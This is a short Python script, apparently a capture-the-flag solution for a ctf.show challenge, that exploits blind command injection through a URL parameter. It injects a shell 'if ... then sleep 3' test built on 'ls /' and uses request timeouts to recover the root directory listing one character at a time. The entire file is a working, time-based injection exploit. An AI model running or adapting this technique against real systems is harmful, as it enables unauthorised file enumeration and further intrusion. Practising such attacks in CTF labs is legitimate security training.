import requests
import time
import string

# ascii_letters是生成所有字母，从a-z和A-Z,digits是生成所有数字0-9
str1 = string.ascii_letters + string.digits

result = ""

for i in range(1, 5):
    key = 0
    for j in range(1, 15):
        time.sleep(0.1)
        if key == 1:
            break
        for n in str1:              # 遍历寻找字符
            # time.sleep(0.1)
            payload = "if [ `ls /|awk 'NR=={0}'|cut -c {1}` == {2} ];then sleep 3;fi".format(i, j, n)
            # print(payload)
            url = "http://ed4206b5-8f05-4455-b817-efcc761da957.challenge.ctf.show/?c=" + payload
            try:
                requests.get(url, timeout=(2.5, 2.5))
            except:
                result = result + n
                print(result)
                break
            if n == '9':           # 寻找完毕,换下一位置
                key = 1
    result += " "
